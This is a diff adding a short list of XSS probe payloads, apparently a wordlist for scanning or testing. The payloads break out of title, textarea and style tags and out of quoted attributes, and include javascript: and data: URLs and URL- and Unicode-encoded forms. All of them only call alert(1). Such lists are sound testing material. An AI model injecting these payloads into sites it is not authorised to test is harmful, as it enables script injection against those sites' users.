@@ -1,0 +1,21 @@
+# HTML text context
+</title><svg onload=alert(1)>
+</textarea><svg onload=alert(1)>
+</style><svg onload=alert(1)>
+
+# Double-quoted attribute context
+"><svg onload=alert(1)>
+" autofocus onfocus=alert(1) x="
+
+# Single-quoted attribute context
+'><svg onload=alert(1)>
+' autofocus onfocus=alert(1) x='
+
+# URL-valued attribute checks
+javascript:alert(1)
+data:text/html,<svg onload=alert(1)>
+
+# Encoded reflection checks
+%3Csvg%20onload%3Dalert(1)%3E
+%253Csvg%2520onload%253Dalert(1)%253E
+\u003csvg onload=alert(1)\u003e
